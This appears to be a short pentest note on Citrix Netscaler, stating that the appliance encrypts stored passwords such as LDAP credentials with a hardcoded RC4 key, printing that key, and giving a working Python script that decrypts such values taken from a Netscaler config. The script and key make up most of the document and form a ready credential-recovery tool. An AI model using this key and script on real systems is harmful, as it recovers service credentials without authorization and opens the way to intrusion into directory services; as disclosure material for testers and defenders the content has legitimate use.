## Netscaler

Netscaler has a hardcoded RC4 encryption key used to encrypt cleartext passwords stored in the config, such as for LDAP. The static encryption key exists in the libnscli90.so library, and as of 10.5 is `2286da6ca015bcd9b7259753c2a5fbc2`.

The below python script will decrypt LDAP and similar encrypted values obtained from the config.
````
#!/usr/bin/python
from Crypto.Cipher import ARC4
import sys, binascii

def decrypt(key, hex):
        out_cipher = ARC4.new(key)
        decoded = out_cipher.decrypt(hex)
        return decoded

def main():
        #Key hardcoded into netscaler libnscli90.so
        key = binascii.unhexlify("2286da6ca015bcd9b7259753c2a5fbc2")

        if len(sys.argv) == 2:
            raw_in = sys.argv[1]
            ciphertext = binascii.unhexlify(raw_in)
            print decrypt(key,ciphertext)

main()
````
